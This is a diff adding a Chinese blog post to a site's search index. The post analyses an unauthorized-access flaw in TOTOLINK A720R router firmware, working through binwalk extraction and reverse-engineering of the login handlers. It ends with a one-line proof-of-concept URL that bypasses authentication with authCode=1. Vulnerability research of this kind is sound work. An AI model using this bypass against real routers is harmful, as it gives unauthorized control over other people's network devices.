@@ -1554,4 +1554,77 @@
         <tag>TP-Link</tag>
       </tags>
   </entry>
+  <entry>
+    <title>TOTOLINK未授权访问漏洞分析</title>
+    <url>/posts/TOTOLINK%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html</url>
+    <content><![CDATA[<h1 id="固件下载"><a href="#固件下载" class="headerlink" title="固件下载"></a>固件下载</h1><p><a class="link"   href="https://totolink.tw/support_view/A720R" >A720R AC1200 無線路由器｜TOTOLINK 台灣<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h1 id="固件解压及模拟"><a href="#固件解压及模拟" class="headerlink" title="固件解压及模拟"></a>固件解压及模拟</h1><div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">binwalk -Me TOTOLINK_A720R_V4.1.5cu.521_B20210224_ALL.web</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250401160426625.png"
+                      alt="image-20250401160426625"
+                ><figcaption>image-20250401160426625</figcaption></figure></p>
+<p>找到web服务是<code>lighttpd</code></p>
+<p>先用户级模拟试下</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250401163143467.png"
+                      alt="image-20250401163143467"
+                ><figcaption>image-20250401163143467</figcaption></figure></p>
+<p>发现需要config，在<code>lighttp/lighttpd.conf</code>；</p>
+<h1 id="系统模拟"><a href="#系统模拟" class="headerlink" title="系统模拟"></a>系统模拟</h1><div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">lighttpd -f /lighttp/lighttpd.conf -m /lighttp/lib/</span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250401170025324.png"
+                      alt="image-20250401170025324"
+                ><figcaption>image-20250401170025324</figcaption></figure></p>
+<p>页面没出来。。。。。。</p>
+<h1 id="固件分析"><a href="#固件分析" class="headerlink" title="固件分析"></a>固件分析</h1><p>搜索有关login的函数</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250401170412947.png"
+                      alt="image-20250401170412947"
+                ><figcaption>image-20250401170412947</figcaption></figure></p>
+<p>跟进<code>userloginAuth</code>函数</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250401170434144.png"
+                      alt="image-20250401170434144"
+                ><figcaption>image-20250401170434144</figcaption></figure></p>
+<p>继续去<code>From_Login</code></p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250401170520229.png"
+                      alt="image-20250401170520229"
+                ><figcaption>image-20250401170520229</figcaption></figure></p>
+<p>可以看到当参数名字是<code>authCode</code>时，给v6赋值为1的时候</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://berial123.oss-cn-beijing.aliyuncs.com/undefinedimage-20250401171811710.png"
+                      alt="image-20250401171811710"
+                ><figcaption>image-20250401171811710</figcaption></figure></p>
+<p>然后就会进入这个判断；</p>
+<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.0.6/fromLoginAuth.htm?authCode=1&amp;action=login</span><br></pre></td></tr></table></figure></div>
+
+]]></content>
+      <categories>
+        <category>IOT</category>
+        <category>CVE</category>
+        <category>TOTOLINK</category>
+      </categories>
+      <tags>
+        <tag>IOT</tag>
+        <tag>CVE</tag>
+        <tag>TOTOLINK</tag>
+      </tags>
+  </entry>
 </search>
